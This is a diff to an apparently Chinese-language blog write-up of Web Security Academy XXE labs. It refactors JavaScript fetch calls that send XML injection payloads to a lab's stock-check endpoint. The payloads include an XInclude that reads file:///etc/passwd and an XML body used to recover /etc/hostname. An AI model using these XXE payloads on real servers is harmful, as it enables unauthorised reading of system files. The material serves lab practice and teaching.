@@ -74,18 +74,14 @@ world
 這題簡單到我還沒意識到就通關了
 
 ```js
-fetch(
-  "https://0a95003503688eab825c4374001800ee.web-security-academy.net/product/stock",
-  {
-    headers: {
-      "content-type": "application/x-www-form-urlencoded",
-    },
-    body: `productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1`,
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/product/stock`, {
+  headers: {
+    "content-type": "application/x-www-form-urlencoded",
   },
-);
+  body: `productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1`,
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 不過我很想吐槽的是，這根本是盲注（？誰會知道 API 的 productId 欄位會在 Backend 被轉成 XML，這比 SQLi 還不直覺啊（？也有可能是我太菜...
@@ -182,18 +178,14 @@ const xmlPayload = `<?xml version="1.0" encoding="UTF-8"?>
     <storeId>1</storeId>
 </stockCheck>`;
 
-fetch(
-  "https://0a8700c603e0a0a2b4b0b3da007800c5.web-security-academy.net/product/stock",
-  {
-    headers: {
-      "content-type": "application/xml",
-    },
-    body: xmlPayload,
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/product/stock`, {
+  headers: {
+    "content-type": "application/xml",
   },
-);
+  body: xmlPayload,
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 之後到 `/log` 查看 `/etc/hostname` 的內容，即可通關～
